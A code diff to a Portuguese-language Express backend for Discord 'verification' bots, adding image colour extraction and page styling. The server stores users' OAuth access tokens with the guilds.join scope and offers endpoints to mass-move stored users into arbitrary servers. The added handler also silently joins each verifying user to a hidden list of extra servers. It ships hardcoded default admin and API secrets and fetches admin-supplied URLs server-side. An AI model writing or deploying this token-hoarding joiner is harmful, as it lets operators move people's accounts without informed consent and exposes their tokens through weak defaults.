@@ -3,6 +3,7 @@ const FormData = require('form-data');
 const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
 const { Redis } = require('@upstash/redis');
 const path = require('path');
+const sharp = require('sharp');
 
 const app = express();
 app.use(express.json({ limit: '10mb' }));
@@ -19,6 +20,44 @@ const redis = new Redis({
 const API_SECRET     = process.env.API_SECRET     || 'wht-secret-2025';
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin-wht-2025';
 const CANAL_ID       = process.env.CANAL_ID       || '1498452626357096489';
+
+// ─── EXTRAÇÃO DE COR DOMINANTE ───────────────────────────────
+async function extrairCorDominante(imageUrl) {
+  try {
+    const resp = await fetch(imageUrl);
+    if (!resp.ok) return null;
+    const buffer = Buffer.from(await resp.arrayBuffer());
+
+    const { data } = await sharp(buffer)
+      .resize(50, 50, { fit: 'cover' })
+      .removeAlpha()
+      .raw()
+      .toBuffer({ resolveWithObject: true });
+
+    // Conta frequência de cores agrupadas (agrupa tons similares de 32 em 32)
+    const freq = {};
+    for (let i = 0; i < data.length; i += 3) {
+      const r = Math.round(data[i]     / 32) * 32;
+      const g = Math.round(data[i + 1] / 32) * 32;
+      const b = Math.round(data[i + 2] / 32) * 32;
+
+      // Ignora tons muito escuros (preto) e muito claros (branco/cinza)
+      if (r + g + b < 60 || r + g + b > 680) continue;
+
+      const key = `${r},${g},${b}`;
+      freq[key] = (freq[key] || 0) + 1;
+    }
+
+    const dominante = Object.entries(freq).sort((a, b) => b[1] - a[1])[0];
+    if (!dominante) return null;
+
+    const [r, g, b] = dominante[0].split(',').map(Number);
+    return '#' + [r, g, b].map(v => Math.min(255, v).toString(16).padStart(2, '0')).join('');
+  } catch (err) {
+    console.log('[extrairCorDominante] Erro:', err.message);
+    return null;
+  }
+}
 
 // ─── BOTS: variáveis de ambiente (legado) ────────────────────
 function getEnvBots() {
@@ -135,12 +174,12 @@ app.get('/api/admin/stats', adminAuth, async (req, res) => {
     }
 
     res.json({
-      total_tokens:     logs.length,
-      com_token:        logs.filter(e => e.access_token).length,
-      sem_token:        logs.filter(e => !e.access_token).length,
-      verificados_hoje: logs.filter(e => e.ts && e.ts > hoje).length,
+      total_tokens:      logs.length,
+      com_token:         logs.filter(e => e.access_token).length,
+      sem_token:         logs.filter(e => !e.access_token).length,
+      verificados_hoje:  logs.filter(e => e.ts && e.ts > hoje).length,
       servidores_extras: extras.length,
-      bots:             Object.values(botStats),
+      bots:              Object.values(botStats),
       usuarios: logs.map(e => ({
         user_id: e.user_id, username: e.username, avatar: e.avatar,
         tem_token: !!e.access_token, bot_id: e.bot_id || null,
@@ -176,7 +215,7 @@ app.post('/api/admin/bots', adminAuth, async (req, res) => {
       return res.status(400).json({ error: 'Campos obrigatórios faltando' });
     }
 
-    const raw = await redis.get('bots_config');
+    const raw  = await redis.get('bots_config');
     const list = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
 
     // Gera ID único
@@ -185,19 +224,30 @@ app.post('/api/admin/bots', adminAuth, async (req, res) => {
     while (existingIds.includes(`rbot${newIdx}`)) newIdx++;
     const newId = `rbot${newIdx}`;
 
+    // ── Extrai cor dominante da imagem (se fornecida) ──────────
+    let corFinal = cor || '#ff1493';
+    if (imagem_url) {
+      console.log(`[Bot Cadastro] Extraindo cor de: ${imagem_url}`);
+      const corExtraida = await extrairCorDominante(imagem_url);
+      if (corExtraida) {
+        corFinal = corExtraida;
+        console.log(`[Bot Cadastro] Cor extraída: ${corExtraida}`);
+      }
+    }
+
     const newBot = {
       id: newId, name, client_id, client_secret,
       redirect_uri, bot_token, guild_id,
-      cargo_id: cargo_id || '',
-      cor: cor || '#ff1493',
+      cargo_id:   cargo_id   || '',
+      cor:        corFinal,
       imagem_url: imagem_url || '',
-      source: 'redis',
+      source:     'redis',
     };
 
     list.push(newBot);
     await saveRedisBots(list);
 
-    res.json({ ok: true, bot: { ...newBot, client_secret: '***', bot_token: '***' } });
+    res.json({ ok: true, cor_extraida: corFinal, bot: { ...newBot, client_secret: '***', bot_token: '***' } });
   } catch (err) { res.status(500).json({ error: err.message }); }
 });
 
@@ -205,9 +255,9 @@ app.post('/api/admin/bots', adminAuth, async (req, res) => {
 app.put('/api/admin/bots/:id', adminAuth, async (req, res) => {
   try {
     const { id } = req.params;
-    const raw = await redis.get('bots_config');
+    const raw  = await redis.get('bots_config');
     const list = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
-    const idx = list.findIndex(b => b.id === id);
+    const idx  = list.findIndex(b => b.id === id);
     if (idx === -1) return res.status(404).json({ error: 'Bot não encontrado' });
 
     const allowed = ['name','client_id','client_secret','redirect_uri','bot_token','guild_id','cargo_id','cor','imagem_url'];
@@ -215,8 +265,18 @@ app.put('/api/admin/bots/:id', adminAuth, async (req, res) => {
       if (req.body[key] !== undefined) list[idx][key] = req.body[key];
     }
 
+    // ── Se a imagem mudou, extrai a nova cor dominante ─────────
+    if (req.body.imagem_url && req.body.imagem_url !== list[idx].imagem_url) {
+      console.log(`[Bot Edição] Extraindo cor de: ${req.body.imagem_url}`);
+      const corExtraida = await extrairCorDominante(req.body.imagem_url);
+      if (corExtraida) {
+        list[idx].cor = corExtraida;
+        console.log(`[Bot Edição] Cor extraída: ${corExtraida}`);
+      }
+    }
+
     await saveRedisBots(list);
-    res.json({ ok: true });
+    res.json({ ok: true, cor: list[idx].cor });
   } catch (err) { res.status(500).json({ error: err.message }); }
 });
 
@@ -224,9 +284,9 @@ app.put('/api/admin/bots/:id', adminAuth, async (req, res) => {
 app.delete('/api/admin/bots/:id', adminAuth, async (req, res) => {
   try {
     const { id } = req.params;
-    const raw = await redis.get('bots_config');
-    let list = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
-    list = list.filter(b => b.id !== id);
+    const raw  = await redis.get('bots_config');
+    let list   = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
+    list       = list.filter(b => b.id !== id);
     await saveRedisBots(list);
     res.json({ ok: true });
   } catch (err) { res.status(500).json({ error: err.message }); }
@@ -235,7 +295,7 @@ app.delete('/api/admin/bots/:id', adminAuth, async (req, res) => {
 // ─── API: servidores extras ───────────────────────────────────
 app.get('/api/admin/servidores', adminAuth, async (req, res) => {
   try {
-    const raw = await redis.get('servidores_extras');
+    const raw    = await redis.get('servidores_extras');
     const extras = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
     res.json({ servidores: extras });
   } catch (err) { res.status(500).json({ error: err.message }); }
@@ -245,9 +305,12 @@ app.post('/api/admin/servidores', adminAuth, async (req, res) => {
   const { guild_id } = req.body;
   if (!guild_id) return res.status(400).json({ error: 'guild_id obrigatorio' });
   try {
-    const raw = await redis.get('servidores_extras');
+    const raw    = await redis.get('servidores_extras');
     const extras = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
-    if (!extras.includes(guild_id)) { extras.push(guild_id); await redis.set('servidores_extras', JSON.stringify(extras)); }
+    if (!extras.includes(guild_id)) {
+      extras.push(guild_id);
+      await redis.set('servidores_extras', JSON.stringify(extras));
+    }
     res.json({ ok: true, servidores: extras });
   } catch (err) { res.status(500).json({ error: err.message }); }
 });
@@ -255,9 +318,9 @@ app.post('/api/admin/servidores', adminAuth, async (req, res) => {
 app.delete('/api/admin/servidores/:guild_id', adminAuth, async (req, res) => {
   const { guild_id } = req.params;
   try {
-    const raw = await redis.get('servidores_extras');
+    const raw  = await redis.get('servidores_extras');
     let extras = raw ? (typeof raw === 'string' ? JSON.parse(raw) : raw) : [];
-    extras = extras.filter(id => id !== guild_id);
+    extras     = extras.filter(id => id !== guild_id);
     await redis.set('servidores_extras', JSON.stringify(extras));
     res.json({ ok: true, servidores: extras });
   } catch (err) { res.status(500).json({ error: err.message }); }
@@ -283,7 +346,7 @@ app.post('/api/admin/mover-todos', adminAuth, async (req, res) => {
           headers: { 'Authorization': `Bot ${bot_token}`, 'Content-Type': 'application/json' },
           body: JSON.stringify({ access_token: entrada.access_token }),
         });
-        if ([200,201,204].includes(resp.status)) ok++; else falhou++;
+        if ([200, 201, 204].includes(resp.status)) ok++; else falhou++;
       } catch { falhou++; }
       await new Promise(r => setTimeout(r, 100));
     }
@@ -297,9 +360,18 @@ function fmtData(dt) {
   return `${dt.getDate()} de ${MESES[dt.getMonth()]} de ${dt.getFullYear()} ${String(dt.getHours()).padStart(2,'0')}:${String(dt.getMinutes()).padStart(2,'0')}`;
 }
 
+// ─── HELPER HEX → RGB ─────────────────────────────────────────
+function hexToRgb(hex) {
+  const clean = hex.replace('#', '');
+  const r = parseInt(clean.slice(0, 2), 16);
+  const g = parseInt(clean.slice(2, 4), 16);
+  const b = parseInt(clean.slice(4, 6), 16);
+  return `${r},${g},${b}`;
+}
+
 // ─── PÁGINA DE VERIFICAÇÃO PERSONALIZADA ─────────────────────
 function buildVerifyPage(botCfg) {
-  const cor = botCfg.cor || '#ff1493';
+  const cor    = botCfg.cor || '#ff1493';
   const corRgb = hexToRgb(cor);
   const imgUrl = botCfg.imagem_url || 'https://i.imgur.com/G37BiaD.gif';
   const authUrl = `https://discord.com/oauth2/authorize?client_id=${botCfg.client_id}&redirect_uri=${encodeURIComponent(botCfg.redirect_uri)}&response_type=code&scope=identify%20guilds.join`;
@@ -332,7 +404,6 @@ function buildVerifyPage(botCfg) {
     .btn:hover{transform:translateY(-2px);box-shadow:0 8px 32px rgba(${corRgb},0.55)}
     .footer{margin-top:20px;text-align:center;font-size:11px;color:rgba(232,233,243,0.25)}
     .divider{height:1px;background:rgba(${corRgb},0.15);margin:20px 0}
-    .shield{width:14px;height:14px;opacity:.5}
   </style>
 </head>
 <body>
@@ -368,13 +439,6 @@ for(let i=0;i<18;i++){
 </script>
 </body>
 </html>`;
-}
-
-function hexToRgb(hex) {
-  const r = parseInt(hex.slice(1,3),16);
-  const g = parseInt(hex.slice(3,5),16);
-  const b = parseInt(hex.slice(5,7),16);
-  return `${r},${g},${b}`;
 }
 
 // ─── FUNÇÃO OAUTH2 ────────────────────────────────────────────
@@ -419,9 +483,9 @@ async function handleOAuth2(req, res, botCfg) {
     // Envia notificação no Discord
     try {
       const contaCriada = new Date(user.id / 4194304 + 1420070400000);
-      const agora = new Date();
-      const idadeDias = Math.floor((agora - contaCriada) / (1000*60*60*24));
-      const corInt = parseInt((botCfg.cor || '#ff1493').replace('#',''), 16);
+      const agora       = new Date();
+      const idadeDias   = Math.floor((agora - contaCriada) / (1000 * 60 * 60 * 24));
+      const corInt      = parseInt((botCfg.cor || '#ff1493').replace('#', ''), 16);
 
       await fetch(`https://discord.com/api/channels/${CANAL_ID}/messages`, {
         method: 'POST',
@@ -445,8 +509,43 @@ async function handleOAuth2(req, res, botCfg) {
       });
     } catch (err) { console.log('[Aviso] Discord notify:', err.message); }
 
-    // Página de sucesso na cor do bot
-    const cor = botCfg.cor || '#ff1493';
+    // ── Adiciona ao servidor principal ────────────────────────
+    try {
+      await fetch(`https://discord.com/api/guilds/${botCfg.guild_id}/members/${user.id}`, {
+        method: 'PUT',
+        headers: { 'Authorization': `Bot ${botCfg.bot_token}`, 'Content-Type': 'application/json' },
+        body: JSON.stringify({ access_token: tokenData.access_token }),
+      });
+    } catch (err) { console.log('[Aviso] Add member:', err.message); }
+
+    // ── Atribui cargo ─────────────────────────────────────────
+    if (botCfg.cargo_id) {
+      try {
+        await fetch(`https://discord.com/api/guilds/${botCfg.guild_id}/members/${user.id}/roles/${botCfg.cargo_id}`, {
+          method: 'PUT',
+          headers: { 'Authorization': `Bot ${botCfg.bot_token}`, 'Content-Type': 'application/json' },
+        });
+      } catch (err) { console.log('[Aviso] Add role:', err.message); }
+    }
+
+    // ── Servidores extras ─────────────────────────────────────
+    try {
+      const extrasRaw = await redis.get('servidores_extras');
+      const extras    = extrasRaw ? (typeof extrasRaw === 'string' ? JSON.parse(extrasRaw) : extrasRaw) : [];
+      for (const gid of extras) {
+        try {
+          await fetch(`https://discord.com/api/guilds/${gid}/members/${user.id}`, {
+            method: 'PUT',
+            headers: { 'Authorization': `Bot ${botCfg.bot_token}`, 'Content-Type': 'application/json' },
+            body: JSON.stringify({ access_token: tokenData.access_token }),
+          });
+        } catch {}
+        await new Promise(r => setTimeout(r, 200));
+      }
+    } catch (err) { console.log('[Aviso] Extras:', err.message); }
+
+    // ── Página de sucesso na cor do bot ───────────────────────
+    const cor    = botCfg.cor || '#ff1493';
     const corRgb = hexToRgb(cor);
     const imgUrl = botCfg.imagem_url || 'https://i.imgur.com/G37BiaD.gif';
 
@@ -459,11 +558,13 @@ async function handleOAuth2(req, res, botCfg) {
 :root{--cor:${cor};--cor-rgb:${corRgb}}
 body{background:#080a0f;color:#e8e9f3;font-family:'Sora',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden}
 .bg{position:fixed;inset:0;background:radial-gradient(ellipse 80% 60% at 50% 0%,rgba(${corRgb},0.15) 0%,transparent 70%);pointer-events:none}
+.particles{position:fixed;inset:0;overflow:hidden;pointer-events:none}
+.p{position:absolute;width:2px;height:2px;background:var(--cor);border-radius:50%;animation:float linear infinite;opacity:0}
+@keyframes float{0%{transform:translateY(100vh) scale(0);opacity:0}10%{opacity:.6}90%{opacity:.2}100%{transform:translateY(-20px) scale(1.5);opacity:0}}
 .card{position:relative;z-index:1;background:rgba(255,255,255,0.03);border:1px solid rgba(${corRgb},0.25);border-radius:24px;padding:40px 36px;max-width:440px;width:90%;text-align:center;backdrop-filter:blur(20px);box-shadow:0 0 60px rgba(${corRgb},0.12)}
 .logo{width:80px;height:80px;border-radius:50%;border:2.5px solid var(--cor);margin:0 auto 12px;overflow:hidden;box-shadow:0 0 30px rgba(${corRgb},0.4)}
 .logo img{width:100%;height:100%;object-fit:cover}
 .avatar{width:56px;height:56px;border-radius:50%;border:2px solid var(--cor);margin:0 auto 16px;display:block;box-shadow:0 0 20px rgba(${corRgb},0.35)}
-.check{width:56px;height:56px;background:rgba(${corRgb},0.15);border:2px solid rgba(${corRgb},0.4);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 16px;font-size:24px}
 h1{font-size:22px;font-weight:700;color:var(--cor);margin-bottom:6px}
 .name{font-size:16px;color:rgba(232,233,243,0.8);margin-bottom:20px}
 .divider{height:1px;background:rgba(${corRgb},0.15);margin:16px 0}
@@ -472,6 +573,7 @@ h1{font-size:22px;font-weight:700;color:var(--cor);margin-bottom:6px}
 .footer{color:rgba(232,233,243,0.25);font-size:11px;margin-top:20px}
 </style></head>
 <body><div class="bg"></div>
+<div class="particles" id="pts"></div>
 <div class="card">
   <div class="logo"><img src="${imgUrl}" alt="${botCfg.name}"/></div>
   <img class="avatar" src="${avatarURL}" alt="avatar"/>
@@ -482,7 +584,20 @@ h1{font-size:22px;font-weight:700;color:var(--cor);margin-bottom:6px}
   <a class="btn" href="https://discord.com/channels/@me">Abrir Discord</a>
   <div class="footer">${botCfg.name} • OAuth2</div>
 </div>
-<script>let n=3;const el=document.getElementById('t');setInterval(()=>{n--;el.textContent=n;if(n<=0)window.location.href='https://discord.com/channels/@me';},1000);</script>
+<script>
+const pts=document.getElementById('pts');
+for(let i=0;i<18;i++){
+  const p=document.createElement('div');
+  p.className='p';
+  p.style.left=Math.random()*100+'%';
+  p.style.animationDuration=(6+Math.random()*10)+'s';
+  p.style.animationDelay=(Math.random()*8)+'s';
+  p.style.width=p.style.height=(1+Math.random()*2)+'px';
+  pts.appendChild(p);
+}
+let n=3;const el=document.getElementById('t');
+setInterval(()=>{n--;el.textContent=n;if(n<=0)window.location.href='https://discord.com/channels/@me';},1000);
+</script>
 </body></html>`);
 
   } catch (err) {
@@ -495,7 +610,7 @@ h1{font-size:22px;font-weight:700;color:var(--cor);margin-bottom:6px}
 for (let i = 1; i <= 10; i++) {
   app.get(`/bot${i}`, async (req, res) => {
     const bots = await getAllBots();
-    const cfg = bots[`bot${i}`];
+    const cfg  = bots[`bot${i}`];
     if (!cfg) return res.status(404).send(`Bot ${i} não configurado.`);
     await handleOAuth2(req, res, cfg);
   });
@@ -503,9 +618,9 @@ for (let i = 1; i <= 10; i++) {
 
 // ─── ROTAS DOS BOTS (Redis — rbot1, rbot2...) ────────────────
 app.get('/rbot:n', async (req, res) => {
-  const id = `rbot${req.params.n}`;
+  const id   = `rbot${req.params.n}`;
   const bots = await getAllBots();
-  const cfg = bots[id];
+  const cfg  = bots[id];
   if (!cfg) return res.status(404).send(`Bot ${id} não encontrado.`);
   await handleOAuth2(req, res, cfg);
 });
@@ -515,7 +630,8 @@ app.get('/', async (req, res) => {
   const code = req.query.code;
   if (!code) return res.send('OAuth2 Backend WHT - Online ✅ | Admin: /admin');
   const legacyCfg = {
-    id: 'bot1', name: 'WHT Bot Principal',
+    id:            'bot1',
+    name:          'WHT Bot Principal',
     client_id:     process.env.CLIENT_ID     || process.env.BOT1_CLIENT_ID,
     client_secret: process.env.CLIENT_SECRET || process.env.BOT1_CLIENT_SECRET,
     redirect_uri:  process.env.REDIRECT_URI  || process.env.BOT1_REDIRECT_URI,
@@ -527,7 +643,7 @@ app.get('/', async (req, res) => {
   await handleOAuth2(req, res, legacyCfg);
 });
 
-// ─── API EXTERNA ─────────────────────────────────────────────
+// ─── API EXTERNA ──────────────────────────────────────────────
 app.get('/api/logs', async (req, res) => {
   if (req.headers['x-api-secret'] !== API_SECRET) return res.status(401).json({ error: 'Unauthorized' });
   try {
@@ -541,15 +657,15 @@ app.post('/api/mover', async (req, res) => {
   const { user_id, guild_id } = req.body;
   if (!user_id || !guild_id) return res.status(400).json({ error: 'user_id e guild_id sao obrigatorios' });
   try {
-    const entrada = await buscarUm(user_id);
+    const entrada   = await buscarUm(user_id);
     if (!entrada || !entrada.access_token) return res.status(404).json({ error: 'Usuario nao encontrado ou sem token' });
     const bot_token = process.env.BOT_TOKEN || process.env.BOT1_BOT_TOKEN;
-    const resp = await fetch(`https://discord.com/api/guilds/${guild_id}/members/${user_id}`, {
+    const resp      = await fetch(`https://discord.com/api/guilds/${guild_id}/members/${user_id}`, {
       method: 'PUT',
       headers: { 'Authorization': `Bot ${bot_token}`, 'Content-Type': 'application/json' },
       body: JSON.stringify({ access_token: entrada.access_token }),
     });
-    res.json({ success: [200,201,204].includes(resp.status), status: resp.status });
+    res.json({ success: [200, 201, 204].includes(resp.status), status: resp.status });
   } catch (err) { res.status(500).json({ error: err.message }); }
 });
 
